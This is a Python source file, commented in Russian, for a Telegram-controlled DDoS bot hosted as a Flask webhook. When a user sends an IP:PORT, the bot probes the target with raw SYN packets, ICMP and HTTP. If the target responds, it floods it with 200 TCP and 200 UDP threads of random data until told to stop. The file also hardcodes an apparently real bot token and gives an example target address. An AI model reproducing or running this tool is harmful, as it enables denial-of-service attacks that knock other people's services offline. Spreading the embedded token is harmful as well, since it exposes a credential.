#!/usr/bin/env python3
"""
DDOS БОТ - БЕЗ КОМАНД | AUTO-RECON
ПРОСТО IP:PORT → ПРОВЕРКА → АТАКА
stop → ОСТАНОВКА
"""

import telebot, socket, threading, random, time, re, os, struct, errno, logging
from flask import Flask, request

# Конфигурация
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
TCP_THREADS = 200
UDP_THREADS = 200
CHECK_TIMEOUT = 3  # Максимальное ожидание ответа при проверке цели

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
active_attacks = {}

# Отключаем излишнее логирование Flask для стабильности
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ------------------------------------------------------------
# МОДУЛЬ ПРОВЕРКИ ЦЕЛИ (STEALTH RECON)
# ------------------------------------------------------------

def calculate_checksum(data):
    """Расчет контрольной суммы для IP/ICMP/TCP заголовков."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def syn_probe(ip, port):
    """
    SYN Probe через RAW_SOCKET.
    Возвращает: (True, "открыт/закрыт/фильтрован") или (False, "причина").
    """
    try:
        # Создаем RAW сокет для приема ответов
        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        recv_socket.settimeout(CHECK_TIMEOUT)

        # Создаем RAW сокет для отправки SYN
        send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        send_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # Генерация IP заголовка
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20  # IP header + TCP header
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton("0.0.0.0")  # Подставляется автоматически
        ip_daddr = socket.inet_aton(ip)

        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        # Генерация TCP заголовка (SYN)
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5
        flags = 2  # SYN
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0

        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, port, seq_num, ack_num,
            (data_offset << 4), flags, window, check, urg_ptr)

        # Расчет псевдозаголовка для контрольной суммы TCP
        source_address = socket.inet_aton("10.0.0.1")  # Спурф-адрес для расчета, в дейтаграмме будет реальный
        dest_address = ip_daddr
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        tcp_check = calculate_checksum(psh)

        # Пересобираем TCP заголовок с контрольной суммой
        tcp_header = struct.pack('!HHLLBBH',
            src_port, port, seq_num, ack_num,
            (data_offset << 4), flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)

        # Отправка пакета
        packet = ip_header + tcp_header
        send_socket.sendto(packet, (ip, 0))

        # Ожидание ответа
        while True:
            try:
                data, addr = recv_socket.recvfrom(1024)
                if addr[0] == ip:
                    # Извлекаем TCP флаги из ответа
                    tcp_flags = data[47]  # 14 байт IP + 13 байт смещение до флагов в TCP
                    if tcp_flags & 0x12:  # SYN-ACK
                        # Отправляем RST чтобы закрыть соединение
                        rst_flags = 4
                        rst_header = struct.pack('!HHLLBBH',
                            src_port, port, 0, data[38:42],
                            (5 << 4), rst_flags, window) + struct.pack('H', 0) + struct.pack('!H', 0)
                        send_socket.sendto(ip_header + rst_header, (ip, 0))
                        recv_socket.close()
                        send_socket.close()
                        return True, f"SYN-ACK: Порт {port} открыт | Цель жива"
                    elif tcp_flags & 0x04:  # RST
                        recv_socket.close()
                        send_socket.close()
                        return True, f"RST: Порт {port} закрыт | Цель жива"
            except socket.timeout:
                recv_socket.close()
                send_socket.close()
                return False, "Timeout: Нет ответа на SYN (фильтрация или хост выключен)"
            except Exception:
                continue
    except PermissionError:
        return None, "Требуются права root для RAW_SOCKET"
    except Exception as e:
        return None, f"Ошибка SYN Probe: {str(e)}"

def icmp_ping(ip):
    """Проверка цели через ICMP Echo Request."""
    try:
        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_socket.settimeout(CHECK_TIMEOUT)
        packet_id = random.randint(1, 65535)
        header = struct.pack('!BBHHH', 8, 0, 0, packet_id, 1)
        data = b'ping_check_' + struct.pack('!d', time.time())
        checksum = calculate_checksum(header + data)
        header = struct.pack('!BBHHH', 8, 0, checksum, packet_id, 1)
        icmp_socket.sendto(header + data, (ip, 0))
        while True:
            try:
                recv_data, addr = icmp_socket.recvfrom(1024)
                if addr[0] == ip:
                    icmp_socket.close()
                    return True, f"ICMP Reply: Цель жива | TTL={recv_data[8]}"
            except socket.timeout:
                icmp_socket.close()
                return False, "Timeout: ICMP не получен"
    except PermissionError:
        return None, "Требуются права root для ICMP"
    except Exception as e:
        return None, f"Ошибка ICMP: {str(e)}"

def http_ping(ip, port):
    """Проверка цели через HTTP HEAD запрос."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CHECK_TIMEOUT)
        s.connect((ip, port))
        request = f"HEAD / HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0 (Compatibility Check)\r\n\r\n"
        s.send(request.encode())
        response = s.recv(1024)
        s.close()
        if response:
            status_line = response.split(b'\r\n')[0].decode()
            return True, f"HTTP Response: {status_line} | Цель жива"
        return False, "Пустой HTTP ответ"
    except socket.timeout:
        return False, "HTTP Timeout"
    except ConnectionRefusedError:
        return True, "RST: Соединение отклонено | Цель жива"
    except Exception as e:
        return False, f"HTTP Error: {str(e)}"

def check_target(ip, port):
    """
    Многоступенчатая проверка цели.
    Возвращает (True/False, "Сообщение для пользователя").
    """
    # Проверяем, валиден ли вообще IP и доступен ли он
    try:
        socket.inet_aton(ip)
    except socket.error:
        return False, "Невалидный IP адрес"

    # Быстрый предварительный тест на доступность порта через connect
    try:
        quick_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        quick_socket.settimeout(1.5)
        result = quick_socket.connect_ex((ip, port))
        quick_socket.close()
        if result == 0:
            return True, f"Прямое подключение: {ip}:{port} доступен"
    except:
        pass

    # Попытка SYN Probe
    status, message = syn_probe(ip, port)
    if status is True:
        return True, message
    elif status is None:  # Нет прав на RAW
        # Пробуем ICMP как альтернативу
        icmp_status, icmp_msg = icmp_ping(ip)
        if icmp_status is True:
            return True, f"Цель жива по ICMP. Порт {port} не проверен. {icmp_msg}"
        # Пробуем HTTP
        http_status, http_msg = http_ping(ip, port)
        if http_status is True:
            return True, f"Цель жива по HTTP. {http_msg}"
        return False, f"Не удалось проверить цель: {message} | {icmp_msg} | {http_msg}"
    else:  # status is False
        # Если SYN не прошел, пробуем ICMP
        icmp_status, icmp_msg = icmp_ping(ip)
        if icmp_status is True:
            return True, f"Цель жива по ICMP, но порт {port} фильтрован/закрыт. {icmp_msg}"
        http_status, http_msg = http_ping(ip, port)
        if http_status is True:
            return True, f"Цель жива по HTTP, но SYN не прошел. {http_msg}"
        return False, f"Цель не отвечает: {message} | {icmp_msg}"

# ------------------------------------------------------------
# УДАРНОЕ ЯДРО
# ------------------------------------------------------------

def tcp_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ip, port))
            s.send(random._urandom(1024))
            s.close()
        except:
            pass
        time.sleep(0.00001)

def udp_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1400), (ip, port))
            s.close()
        except:
            pass
        time.sleep(0.00001)

class Attack:
    def __init__(self, ip, port):
        self.ip, self.port, self.stop_flag = ip, port, threading.Event()
        self.threads = []
    def start(self):
        for i in range(TCP_THREADS):
            t = threading.Thread(target=tcp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        for i in range(UDP_THREADS):
            t = threading.Thread(target=udp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
    def stop(self):
        self.stop_flag.set()

def parse_target(text):
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), None
    return None, None

# ------------------------------------------------------------
# ОБРАБОТЧИКИ TELEGRAM
# ------------------------------------------------------------

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(m):
    cid = m.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(m, "🛑 Атака остановлена")
        del active_attacks[cid]
    else:
        bot.reply_to(m, "💤 Нет активной атаки")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(m):
    cid = m.chat.id
    ip, port = parse_target(m.text)
    if not ip:
        bot.reply_to(m, "❌ Неверный формат IP адреса")
        return
    if cid in active_attacks:
        bot.reply_to(m, "⚠️ Атака уже активна! Используйте stop для остановки")
        return
    if not port:
        port = 15455  # порт по умолчанию

    # Уведомляем пользователя о начале проверки
    status_msg = bot.reply_to(m, f"🔍 Проверка цели {ip}:{port}...")

    # Запускаем проверку цели в отдельном потоке, чтобы не блокировать бота
    def verify_and_launch():
        target_alive, check_message = check_target(ip, port)
        if target_alive:
            a = Attack(ip, port)
            a.start()
            active_attacks[cid] = a
            bot.edit_message_text(
                f"✅ Цель подтверждена: {check_message}\n"
                f"💀 АТАКА ЗАПУЩЕНА\n{ip}:{port}\nTCP:{TCP_THREADS} UDP:{UDP_THREADS}\nstop - остановка",
                chat_id=cid, message_id=status_msg.message_id
            )
        else:
            bot.edit_message_text(
                f"❌ Цель недоступна: {check_message}\nАтака отменена.",
                chat_id=cid, message_id=status_msg.message_id
            )

    threading.Thread(target=verify_and_launch, daemon=True).start()

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'OK', 200
    try:
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except:
        return 'error', 500

@app.route('/')
def index():
    return 'DDOS BOT WITH AUTO-RECON'

if __name__ == "__main__":
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/webhook/{BOT_TOKEN}")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
